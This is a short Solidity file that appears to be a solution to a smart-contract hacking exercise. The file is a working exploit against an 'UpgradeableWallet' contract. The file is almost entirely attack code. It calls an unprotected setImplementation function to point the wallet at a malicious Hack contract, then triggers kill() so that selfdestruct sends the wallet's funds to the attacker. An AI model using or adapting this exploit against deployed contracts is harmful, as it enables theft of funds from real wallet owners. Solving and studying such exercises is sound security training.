// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

contract UpgradeableWalletExploit {
    address public target;
    Hack public hack;
    constructor(address _target) {
        // target is address of UpgradeableWallet
        target = _target;
        hack = new Hack();
    }

    function pwn() external {
        // write your code here and anywhere else
        target.call(abi.encodeWithSignature("setImplementation(address)", address(hack)));
        target.call(abi.encodeWithSignature("kill()"));
    }
}

contract Hack {
    address public owner;
    
    constructor() {
        owner = msg.sender;
    }
    
    function kill() external {
        selfdestruct(payable(owner));
    }
}